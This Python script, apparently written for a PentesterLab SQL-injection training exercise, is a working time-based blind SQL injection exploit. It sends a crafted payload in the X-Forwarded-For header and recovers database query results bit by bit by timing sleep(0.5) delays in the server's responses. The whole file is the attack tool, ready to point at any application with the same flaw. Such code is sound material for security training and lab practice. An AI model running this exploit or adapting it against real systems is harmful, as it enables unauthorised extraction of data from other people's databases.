import socket
import sys
import time

""" Script used for the pentesterlab course
    From SQL injection to Shell II """

if(sys.argv[1]):
    inject = sys.argv[1]
else:
    print("sql-blind.py sql_payload [nb_result]")

#used to store then display the hidden result of the query
result = ''
nb_results = sys.argv[2] if len(sys.argv) == 3 else 1


def bit_test(payload):
    #Create the socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    #The server url and port
    sock.connect(("127.0.0.1", 9090))
    payload = "hacker' or {}".format(payload)
    #print(payload)
    start = time.time()
    sock.send(str.encode("GET http://vulnerable/ HTTP/1.1\r\nHost: vulnerable\r\nX-Forwarded-For: {}\r\nConnection: close\r\n\r\n".format(payload)))
    while True:
        data = sock.recv(1024)
        if not data :
            sock.close()
            break

    stop = time.time()
    return (stop - start) > 0.5


def get_query_result(inject):
    inject += " limit {}, 1"
    result_line = 'init'
    result_char = 1 

    l = 1
    while result_line != '':
        result_line = ''
        c = 1
        inject = inject.format(l-1)
        while result_char != 0:
            result_char = 0   
            for p in range(8):
                payload = "if((select ascii(substring(({}), {}, 1))&{}), sleep(0.5), 0) #".format(inject, c, 2**p)    
                if(bit_test(payload)):
                    result_char += 2**p
            result_line += chr(result_char)
            print(result_line)
            c += 1
        l += 1 
        print(result_line)

get_query_result(inject)
